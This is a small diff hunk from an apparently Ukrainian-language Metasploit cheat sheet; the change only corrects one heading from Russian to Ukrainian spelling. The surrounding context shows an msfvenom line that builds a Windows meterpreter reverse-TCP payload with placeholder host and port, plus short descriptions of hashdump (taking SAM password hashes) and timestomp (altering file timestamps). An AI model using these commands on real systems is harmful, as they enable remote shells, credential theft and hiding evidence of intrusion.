@@ -76,7 +76,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -
 
 **hashdump** — захватє хеши з файлу паролів (SAM).  
 
-## Команды Timestomp:  
+## Команди Timestomp:  
 
 **timestomp** — керує зміною, доступом і створеням атрибутів файлу.  
 
